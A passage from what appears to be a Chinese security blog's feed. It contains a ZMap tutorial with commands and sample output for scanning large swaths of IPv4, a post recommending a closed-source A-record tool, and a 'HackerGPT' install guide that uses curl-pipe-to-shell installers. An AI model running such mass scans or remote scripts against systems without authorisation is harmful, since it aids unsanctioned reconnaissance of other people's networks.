class="line">sudo zmap -p 80 -o "output.csv" -B 1G --sender-threads=1 171.67.70.0/2</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:00 0%; send: 211 1 p/s (3.69 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">0:00 0%; send: 400 274 Kp/s (6.92 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">0:01 0%; send: 505473 505 Kp/s (478 Kp/s avg); recv: 5176 5.17 Kp/s (4.89 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.02%</span><br><span class="line">0:02 0%; send: 1113056 607 Kp/s (541 Kp/s avg); recv: 12962 7.78 Kp/s (6.30 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.16%</span><br><span class="line">0:03 0%; send: 1726996 614 Kp/s (565 Kp/s avg); recv: 20562 7.60 Kp/s (6.72 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.19%</span><br><span class="line">0:04 0%; send: 2335833 609 Kp/s (575 Kp/s avg); recv: 28571 8.01 Kp/s (7.04 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.22%</span><br><span class="line">0:05 0% (30m left); send: 2943829 608 Kp/s (582 Kp/s avg); recv: 36420 7.85 Kp/s (7.20 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.24%</span><br><span class="line">0:06 0% (30m left); send: 3550851 607 Kp/s (586 Kp/s avg); recv: 44122 7.70 Kp/s (7.28 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.24%</span><br><span class="line">0:07 0% (30m left); send: 4156961 606 Kp/s (589 Kp/s avg); recv: 52047 7.92 Kp/s (7.37 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.25%</span><br><span class="line">0:08 0% (30m left); send: 4756743 600 Kp/s (590 Kp/s avg); recv: 59834 7.79 Kp/s (7.42 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.26%</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h4 id="4线程发送速率"><a href="#4线程发送速率" class="headerlink" title="4线程发送速率"></a><strong>4线程发送速率</strong></h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 -o "output.csv" -B 1G --sender-threads=4 171.67.70.0/2</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:00 0%; send: 360 1 p/s (5.31 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">0:00 0%; send: 586 388 Kp/s (8.58 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">0:01 0%; send: 1125395 1.12 Mp/s (1.05 Mp/s avg); recv: 11804 11.8 Kp/s (11.0 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.05%</span><br><span class="line">0:02 0%; send: 2401617 1.28 Mp/s (1.16 Mp/s avg); recv: 28248 16.4 Kp/s (13.7 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.18%</span><br><span class="line">0:03 0%; send: 3667077 1.27 Mp/s (1.19 Mp/s avg); recv: 44305 16.1 Kp/s (14.4 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.21%</span><br><span class="line">0:04 0%; send: 4932812 1.27 Mp/s (1.21 Mp/s avg); recv: 60886 16.6 Kp/s (15.0 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.23%</span><br><span class="line">0:05 1% (14m left); send: 6193698 1.26 Mp/s (1.22 Mp/s avg); recv: 77131 16.2 Kp/s (15.2 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.25%</span><br><span class="line">0:06 1% (14m left); send: 7452466 1.26 Mp/s (1.23 Mp/s avg); recv: 93092 16.0 Kp/s (15.3 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.25%</span><br><span class="line">0:07 1% (14m left); send: 8713445 1.26 Mp/s (1.23 Mp/s avg); recv: 109494 16.4 Kp/s (15.5 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.26%</span><br><span class="line">0:08 1% (14m left); send: 9970806 1.26 Mp/s (1.24 Mp/s avg); recv: 125807 16.3 Kp/s (15.6 Kp/s avg); drops: 0 p/s (0 p/s avg); hitrate: 1.26%</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到，增加发送线程的数量提高了数据包发送速率，因此减少了运行时间（预期运行时间为 30 分钟，而预期运行时间为 14 分钟）。对于大多数用途，单个线程可能就足够了，但如果您需要提高性能、拥有高带宽上行链路，并且要扫描大部分 IPv4 空间，则可以使用该线程。</p><h2 id="提高扫描精度"><a href="#提高扫描精度" class="headerlink" title="提高扫描精度"></a>提高扫描精度</h2><p>ZMap 将以 的速率发送数据包<code>min(max rate your Network Interface Card (NIC) can sustain, the rate you specify with CLI flags)</code>。该速率<em>可能</em>高于您的 LAN 或目标子网的处理能力，从而导致数据包丢失和扫描结果不精确。</p><p>删除的<code>SYN</code>或<code>SYN ACK</code>将在 ZMap 中显示为相同，就好像根本不存在主机一样。由于 ZMap 直接组成以太网帧，因此无法保证交付。考虑到这一点，您可能希望降低<code>--rate=pps</code>或<code>--bandwidth=bps</code>确定您的命中率是否保持一致（表明您没有看到大量丢包/漏报）。另一种选择是增加<code>--probes=N (default = 1)</code>. “探测”是 ZMap 术语，指的是 ZMap 发送到潜在主机的数据包，您可以对每个 IP/端口对使用多个探测来尝试解决数据包丢失的情况。</p><h3 id="探测和重复数据删除"><a href="#探测和重复数据删除" class="headerlink" title="探测和重复数据删除"></a>探测和重复数据删除</h3><p>如上一节所述，您可能希望增加计数<code>--probes=N</code>以减少扫描中出现假阴性的可能性。然而，由于 ZMap 是无状态的，它如何防止给定 IP if<code>--probes=N</code>和 的多个日志<code>N &gt; 1</code>？</p><p>例如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 --probes=5 -B 100M --dedup-method=none 171.67.70.0/10</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> 0:00 0%; send: 42 1 p/s (821 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">171.67.224.74</span><br><span class="line">171.67.224.74</span><br><span class="line">171.67.224.74</span><br><span class="line">171.67.224.74</span><br><span class="line">171.67.224.74</span><br><span class="line">171.67.35.131</span><br><span class="line">171.67.35.131</span><br><span class="line">171.67.35.131</span><br><span class="line">171.67.35.131</span><br><span class="line">171.67.35.131</span><br><span class="line">171.67.7.61</span><br><span class="line">171.67.7.61</span><br><span class="line">171.67.7.61</span><br><span class="line">171.67.7.61</span><br><span class="line">171.67.7.61</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>每次响应探测时，都会记录下来。默认情况下，<code>--dedup-method=window</code>窗口大小为1M。这意味着 ZMap 将跟踪内存中最后 1M 探测响应，以避免多次记录命中。您可以使用<code>--dedup-method=full</code>，但要了解内存需求将随着扫描空间的大小而增加。</p><blockquote><p>注意：我们已经说过 ZMap 是无状态的，但在这里我们似乎与该声明相矛盾，提到存储最后 1M 探测响应😄。 ZMap 在发送线程和接收线程之间是无状态的，但 ZMap 的接收线程可以保存状态以免记录重复项。</p></blockquote><h3 id="预期最大发送速率"><a href="#预期最大发送速率" class="headerlink" title="预期最大发送速率"></a>预期最大发送速率</h3><p>在我们的实验室环境中，具有 1 Gbit 有线以太网的现成 Ubuntu 虚拟机每秒可处理多达 1.3-145 万个数据包。使用无线连接、低端硬件或 LAN 带宽争用都可能对您的性能产生负面影响。</p><h2 id="其他扫描"><a href="#其他扫描" class="headerlink" title="其他扫描"></a>其他扫描</h2><h3 id="获取-N-个可达主机"><a href="#获取-N-个可达主机" class="headerlink" title="获取 N 个可达主机"></a>获取 N 个可达主机</h3><p>在前面的示例 ( <code>sudo zmap -p 80 -o "output.csv" -B 1G --sender-threads=4 171.67.70.0/2</code>) 中，我们使用了给定的子网。然而，也许您只想在 IPv4 空间中获得 10 个可访问的主机。您可以使用<code>--max-results=10</code>或<code>-N 10</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 -B 100M -N 10</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 0:00 0%; send: 0 0 p/s (0 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line"> 0:00 0%; send: 0 0 p/s (0 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">104.252.154.129</span><br><span class="line">207.241.227.232</span><br><span class="line">34.102.143.17</span><br><span class="line">185.227.252.87</span><br><span class="line">88.218.93.178</span><br><span class="line">206.54.174.210</span><br><span class="line">50.3.14.225</span><br><span class="line">34.43.9.190</span><br><span class="line">184.84.170.239</span><br><span class="line">154.37.15.2</span><br><span class="line">Dec 05 22:19:22.112 [INFO] zmap: completed</span><br></pre></td></tr></tbody></table></figure><h3 id="再现性和随机搜索"><a href="#再现性和随机搜索" class="headerlink" title="再现性和随机搜索"></a>再现性和随机搜索</h3><p>再次运行上面的命令…</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 -B 100M -N 10</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 0:00 0%; send: 0 0 p/s (0 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line"> 0:00 0%; send: 17 62.7 Kp/s (305 p/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">206.2.159.123</span><br><span class="line">47.251.50.46</span><br><span class="line">144.49.230.210</span><br><span class="line">34.220.245.127</span><br><span class="line">34.160.175.57</span><br><span class="line">216.180.232.245</span><br><span class="line">20.94.252.204</span><br><span class="line">172.65.73.3</span><br><span class="line">38.173.125.213</span><br><span class="line">172.67.201.97</span><br><span class="line">Dec 05 22:33:37.695 [INFO] zmap: completed</span><br></pre></td></tr></tbody></table></figure><p>这很有趣，我们得到了一组完全不同的 IP！当您定义给定的搜索空间时，ZMap 会随机而不是线性地扫描它。当我们想要像之前的扫描一样搜索整个搜索空间时，这并不是什么大问题，因为我们最终仍然会得到相同的（无序的）结果集。然而，在这种情况下，ZMap 在给定搜索空间中找到前 10 个命中时返回。 ZMap 的随机搜索模式导致输出出现这种差异。</p><p>为什么要随机搜索？发送端和接收端都可能发生资源争用。我们希望尽可能分散放置在接收子网上的负载，因此通过随机搜索搜索空间，我们可以分散在给定时间放置在给定网络上的负载。</p><p>您可能希望扫描顺序具有可重复性，因此您可以使用 来<code>--seed=n</code>确保后续运行使用相同的顺序。</p><h3 id="多个端口"><a href="#多个端口" class="headerlink" title="多个端口"></a>多个端口</h3><blockquote><p>ZMap v.4.0.0 中添加</p></blockquote><p>您可以扫描多个端口。在这种情况下，ZMap 将向<code>SYN</code>每个 IP/端口对发送 TCP数据包。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 22,80 -B 100M -N 10 171.67.70.0/10</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 0:00 0%; send: 824 1 p/s (10.7 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line"> 0:00 0%; send: 1163 623 Kp/s (15.0 Kp/s avg); recv: 0 0 p/s (0 p/s avg); drops: 0 p/s (0 p/s avg); hitrate: 0.00%</span><br><span class="line">125.6.184.89,80</span><br><span class="line">125.6.189.199,80</span><br><span class="line">125.62.85.202,22</span><br><span class="line">125.62.86.43,22</span><br><span class="line">125.103.118.1,22</span><br><span class="line">125.135.32.198,80</span><br><span class="line">125.136.125.185,80</span><br><span class="line">125.140.210.154,80</span><br><span class="line">125.143.130.34,80</span><br><span class="line">125.137.239.225,80</span><br><span class="line">Nov 28 23:15:06.878 [INFO] zmap: completed</span><br></pre></td></tr></tbody></table></figure><h3 id="多个子网"><a href="#多个子网" class="headerlink" title="多个子网"></a>多个子网</h3><p>您也可以使用同一扫描来扫描多个子网。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zmap -p 80 10.0.0.0/8 192.168.0.0/16 (scan both subnets on TCP/80)</span><br></pre></td></tr></tbody></table></figure><h2 id="ZMap-的配置文件"><a href="#ZMap-的配置文件" class="headerlink" title="ZMap 的配置文件"></a>ZMap 的配置文件</h2><p>默认情况下，ZMap 不会扫描<em>整个</em>IPv4 空间。有两个文件包含默认情况下不扫描的子网。您可以更改这些文件以显式扫描这些范围，但是在每种情况下，默认情况下不扫描它们都是有原因的。</p><h3 id="blocklist-conf"><a href="#blocklist-conf" class="headerlink" title="blocklist.conf"></a><code>blocklist.conf</code></h3><p><code>blocklist.conf</code>包括 RFC 定义的子网（例如多播、保留/未分配的<a href="https://tools.ietf.org/html/rfc1918">RFC 1918 ，默认情况下不扫描这些子网。如果您不希望扫描某些 IP/子网，可以添加到此文件。</a></p><h3 id="zmap-conf"><a href="#zmap-conf" class="headerlink" title="zmap.conf"></a><code>zmap.conf</code></h3><p>如果您发现自己指定了某些设置，例如每次运行 ZMap 时的最大带宽或黑名单文件，您可以在其中指定这些设置<code>/etc/zmap/zmap.conf</code>或使用自定义配置文件。</p><h3 id="在您的安装中查找配置文件"><a href="#在您的安装中查找配置文件" class="headerlink" title="在您的安装中查找配置文件"></a>在您的安装中查找配置文件</h3><p><em>您通常</em>可以在安装中找到这些文件，位置为<code>/etc/zmap/...conf</code>。</p><p>如果您使用包管理器安装 ZMap，它可能已将配置文件安装在其自己的位置。</p><p>例如，<code>homebrew</code>将配置文件安装在<code>/opt/homebrew/etc/zmap/</code>.如果您无法找到这些文件，请尝试<code>sudo find . -name "blocklist.conf" -maxdepth 5</code>在安装 ZMap 后从根目录运行。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>51-自动解析A记录</title>
      <link href="/2024/04/29/51-%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8Dip%E5%92%8Cip%E4%BF%A1%E6%81%AF/"/>
      <url>/2024/04/29/51-%E8%87%AA%E5%8A%A8%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8Dip%E5%92%8Cip%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h2><p>工具名称:Ajiexi</p><p>是由杨CC利用python开发的一款域名A记录解析工具,非常小巧.下载就能用.</p><h2 id="2-工具截图"><a href="#2-工具截图" class="headerlink" title="2.工具截图"></a>2.工具截图</h2><p><img src="https://pic.imgdb.cn/item/662f79370ea9cb1403f8a9d4.png" alt="img"></p><p>这里可能要稍微解释一下,因为源代码没了,就剩下一个exe了,是通过发送后端请求的方式,进行的解析.(之前上班的时候随手写的,所以会有上面的代码编写和打包人员.嘿嘿~)</p><h2 id="3-下载方式"><a href="#3-下载方式" class="headerlink" title="3.下载方式"></a>3.下载方式</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Sgyling/Yancy/blob/main/README.md #说明链接,这个不是下载链接,因为这一个不一定能用</span><br><span class="line">加入交流群,下载即可.</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>50-黑客GPT安装教程</title>
      <link href="/2024/04/28/50-%E9%BB%91%E5%AE%A2GPT%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2024/04/28/50-%E9%BB%91%E5%AE%A2GPT%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1x个人使用环境"><a href="#1x个人使用环境" class="headerlink" title="1x个人使用环境"></a>1x个人使用环境</h1><p>parrotsec os,可以使用kali</p><h2 id="2x安装"><a href="#2x安装" class="headerlink" title="2x安装"></a>2x安装</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意:请提前开启VPN</span></span><br><span class="line">cd Desktop #进入桌面</span><br><span class="line">mkdir hackergpt #创建文件夹</span><br><span class="line">cd hackergpt #进入文件夹</span><br><span class="line">git clone https://github.com/Hacker-GPT/HackerGPT-2.0.git #进行克隆</span><br><span class="line">ls </span><br><span class="line">cd HakerGPT-2.0 </span><br><span class="line">npm --version #查看是否拥有npm</span><br><span class="line">node --version #查看是否存在node环境</span><br><span class="line">npm install #安装依赖</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="如果node版本低于18-请使用下方命令-如果高于18-请跳过"><a href="#如果node版本低于18-请使用下方命令-如果高于18-请跳过" class="headerlink" title="#如果node版本低于18,请使用下方命令,如果高于18,请跳过"></a>#如果node版本低于18,请使用下方命令,如果高于18,请跳过</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo apt upgrade <span class="comment">#更新</span></span></span><br><span class="line">sudo apt remove npm #卸载npm</span><br><span class="line">sudo apt remove nodejs #删除node.js</span><br><span class="line">sudo apt autoremove #清理没用的安装包</span><br><span class="line">cd .. #返回上一层</span><br><span class="line">mkdir node #创建node文件夹</span><br><span class="line">cd node #进入</span><br><span class="line">wget https://nodejs.org/dist/v20.12.2/node-v20.12.2-linux-x64.tar.xz #下载</span><br><span class="line">tar -xvf node-v20.12.2-linux-x64.tar.xz #解压</span><br><span class="line">mv node-v20.12.2-linux-x64 nodejs #把文件夹名字换成node.js20</span><br><span class="line">cd ndoejs #进入</span><br><span class="line">sudo cp -r nodejs/ /usr/local/sbin/ #将文件复制到目录</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为node及npm建立软链接，以便全局使用</span></span><br><span class="line">sudo ln -s /usr/local/sbin/nodejs/bin/node /usr/local/bin/</span><br><span class="line"></span><br><span class="line">sudo ln -s /usr/local/sbin/nodejs/bin/npm /usr/local/bin/</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../HackerGPT-2.0/ #返回之前的目录</span><br><span class="line"></span><br><span class="line">npm install #安装依赖</span><br></pre></td></tr></tbody></table></figure><h3 id="安装必备软件"><a href="#安装必备软件" class="headerlink" title="#安装必备软件"></a>#安装必备软件</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io docker docker-compose  #安装容器</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果出现报错,请先运行:sudo apt install -f 再运行上方命令,如果还不行就安装缺乏的包,例如:sudo apt install python3-cached-property python3-docker python3-dockerpty python3-docopt python3-texttable</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果还不行,就更新:sudo apt upgrade,更新完再运行上面的命令行</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装完以后会重新启动,重启后打开终端<span class="built_in">cd</span>到目录,再运行下面的命令</span></span><br><span class="line">npm install tailwind-merge --save-dev #安装tailwind-merge模块</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">npm run build <span class="comment">#清理下缓存</span></span> </span><br><span class="line">/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" #安装brew</span><br><span class="line">echo 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"' &gt;&gt; $HOME/.bash_profile #添加到环境变量</span><br><span class="line">eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)" #添加到环境变量</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启终端</span></span><br><span class="line">cd Desktop/HackerGpt/HackerGPT-2.0/ #进入路径</span><br><span class="line">brew install supabase/tap/supabase #安装supabase cli</span><br><span class="line">supabase start #启动supabase</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动后会有一些信息</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/662e5d170ea9cb1403f463fe.png" alt="img"></p><h2 id="填写秘钥"><a href="#填写秘钥" class="headerlink" title="#填写秘钥"></a>#填写秘钥</h2><h4 id="1-环境变量"><a href="#1-环境变量" class="headerlink" title="1.环境变量"></a>1.环境变量</h4><p>在本地 Chatbot UI 存储库根目录的终端中，运行：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .env.local.example .env.local</span><br></pre></td></tr></tbody></table></figure><p>通过运行获取所需的值：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supabase status</span><br></pre></td></tr></tbody></table></figure><p>注意：使用<code>API URL</code>from <code>supabase status</code>for<code>NEXT_PUBLIC_SUPABASE_URL</code></p><p>现在转到您的<code>.env.local</code>文件并填写值。</p><p>如果设置了环境变量，它将禁用用户设置中的输入。</p><h4 id="2-SQL设置"><a href="#2-SQL设置" class="headerlink" title="2. SQL设置"></a>2. SQL设置</h4><p>在第一个迁移文件中，<code>supabase/migrations/20240108234540_setup.sql</code>您需要将 2 个值替换为上面获得的值：</p><ul><li><code>project_url</code>（第 53 行）：（<code>http://supabase_kong_chatbotui:8000</code>默认）如果您不更改文件<code>project_id</code>中的内容，则可以保持不变<code>config.toml</code></li><li><code>service_role_key</code>（第 54 行）：你通过运行获得了这个值<code>supabase status</code></li></ul><p>这可以防止存储文件未被正确删除的问题。</p><h2 id="安装Ollama"><a href="#安装Ollama" class="headerlink" title="#安装Ollama"></a>#安装Ollama</h2><p>运行命令:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://ollama.com/install.sh | sh #需要在同一个终端中运行,路径不变</span><br></pre></td></tr></tbody></table></figure><h2 id="本地运行"><a href="#本地运行" class="headerlink" title="#本地运行"></a>#本地运行</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run chat #运行</span><br></pre></td></tr></tbody></table></figure><h2 id="常见错误"><a href="#常见错误" class="headerlink" title="#常见错误"></a>#常见错误</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">报错: ⨯ Error: Your project's URL and Key are required to create a Supabase client!</span><br><span class="line"></span><br><span class="line">Check your Supabase project's API settings to find these values</span><br><span class="line"></span><br><span class="line">https://supabase.com/dashboard/project/_/settings/api</span><br><span class="line">    at RootLayout (./app/[locale]/layout.tsx:113:87)</span><br><span class="line">    at AsyncLocalStorage.run (node:async_hooks:346:14)</span><br><span class="line">    at AsyncLocalStorage.run (node:async_hooks:346:14)</span><br><span class="line">    at Object.apply (./app/[locale]/layout.tsx:230:10)</span><br><span class="line">    at stringify (&lt;anonymous&gt;)</span><br><span class="line"> ⨯ Error: Your project's URL and Key are required to create a Supabase client!</span><br><span class="line"></span><br><span class="line">Check your Supabase project's API settings to find these values</span><br><span class="line"></span><br><span class="line">https://supabase.com/dashboard/project/_/settings/api</span><br><span class="line">    at RootLayout (./app/[locale]/layout.tsx:113:87)</span><br><span class="line">    at AsyncLocalStorage.run (node:async_hooks:346:14)</span><br><span class="line">    at AsyncLocalStorage.run (node:async_hooks:346:14)</span><br><span class="line">    at Object.apply (./app/[locale]/layout.tsx:230:10)</span><br><span class="line">    at stringify (&lt;anonymous&gt;)</span><br><span class="line">digest: "1122167698"</span><br></pre></td></tr></tbody></table></figure><p>如果出现这种错误,请在.env.local中添加变量:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NEXT_PUBLIC_SUPABASE_URL=这里写API URL</span><br><span class="line">NEXT_PUBLIC_SUPABASE_ANON_KEY=这里写anon key</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行supabase status后,可以看到</span></span><br></pre></td></tr></tbody></table></figure><h3 id="运行supabase-status后的信息为"><a href="#运行supabase-status后的信息为" class="headerlink" title="运行supabase status后的信息为:"></a>运行supabase status后的信息为:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">         API URL: http://127.0.0.1:54321</span><br><span class="line">     GraphQL URL: http://127.0.0.1:54321/graphql/v1</span><br><span class="line">  S3 Storage URL: http://127.0.0.1:54321/storage/v1/s3</span><br><span class="line">          DB URL: 